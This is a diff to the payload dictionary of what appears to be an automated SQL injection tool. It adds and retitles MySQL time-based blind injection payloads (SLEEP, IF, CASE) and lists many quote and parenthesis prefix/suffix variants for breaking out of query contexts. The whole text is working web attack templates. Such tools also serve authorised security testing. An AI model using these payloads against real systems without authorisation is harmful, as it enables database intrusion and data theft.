@@ -378,6 +378,28 @@ PAYLOADS = {
         ],
         "time-based": [
             {
+                "payload": "SLEEP([SLEEPTIME])",
+                "comments": [
+                    {"pref": " AND ", "suf": ""},
+                    {"pref": " OR ", "suf": ""},
+                    {"pref": " AND ", "suf": "-- wXyW"},
+                    {"pref": " OR ", "suf": "-- wXyW"},
+                    {"pref": "' AND ", "suf": "-- wXyW"},
+                    {"pref": "' OR ", "suf": "-- wXyW"},
+                    {"pref": '" AND ', "suf": "-- wXyW"},
+                    {"pref": '" OR ', "suf": "-- wXyW"},
+                    {"pref": ") AND ", "suf": "-- wXyW"},
+                    {"pref": ") OR ", "suf": "-- wXyW"},
+                    {"pref": "') AND ", "suf": "-- wXyW"},
+                    {"pref": "') OR ", "suf": "-- wXyW"},
+                    {"pref": '") AND ', "suf": "-- wXyW"},
+                    {"pref": '") OR ', "suf": "-- wXyW"},
+                ],
+                "title": "MySQL >= 5.0.12 time-based blind (SLEEP)",
+                "vector": "0986=IF(([INFERENCE]),SLEEP([SLEEPTIME]),986)",
+                "dbms": "MySQL",
+            },
+            {
                 "payload": "(SELECT(1)FROM(SELECT(SLEEP([SLEEPTIME])))a)",
                 "comments": [
                     {"pref": "", "suf": ""},
@@ -402,12 +424,12 @@ PAYLOADS = {
                     # {"pref": "')AND", "suf": "AND('1'='1-- wXyW"},
                     # {"pref": '")AND', "suf": 'AND("1"="1-- wXyW'},
                 ],
-                "title": "MySQL time-based blind (query SLEEP)",
+                "title": "MySQL >= 5.0.12 time-based blind (query SLEEP)",
                 "vector": "(SELECT(1)FROM(SELECT(IF([INFERENCE],SLEEP([SLEEPTIME]),0)))a)",
                 "dbms": "MySQL",
             },
             {
-                "payload": "if(now()=sysdate(),sleep([SLEEPTIME]),0)",
+                "payload": "IF(now()=sysdate(),SLEEP([SLEEPTIME]),0)",
                 "comments": [
                     {"pref": "", "suf": ""},
                     {"pref": "", "suf": "-- wXyW"},
@@ -426,8 +448,8 @@ PAYLOADS = {
                     # {"pref": "') OR ", "suf": "OR('1'='1 wXyW"},
                     # {"pref": '") OR ', "suf": 'OR("1"="1-- wXyW'},
                 ],
-                "title": "MySQL OR time-based blind (comment)",
-                "vector": "if([INFERENCE],sleep([SLEEPTIME]),0)",
+                "title": "MySQL >= 5.0.12 time-based blind (IF - comment)",
+                "vector": "IF([INFERENCE],SLEEP([SLEEPTIME]),0)",
                 "dbms": "MySQL",
             },
             {
@@ -454,7 +476,7 @@ PAYLOADS = {
                     # {"pref": "')", "suf": "XOR('1'='1 wXyW"},
                     # {"pref": '")', "suf": 'XOR("1"="1-- wXyW'},
                 ],
-                "title": "MySQL XOR time-based blind (CASE STATEMENT)",
+                "title": "MySQL >= 5.0.12 time-based blind (CASE STATEMENT)",
                 "vector": "(SELECT CASE WHEN([INFERENCE]) THEN SLEEP([SLEEPTIME]) ELSE 0 END)",
                 "dbms": "MySQL",
             },
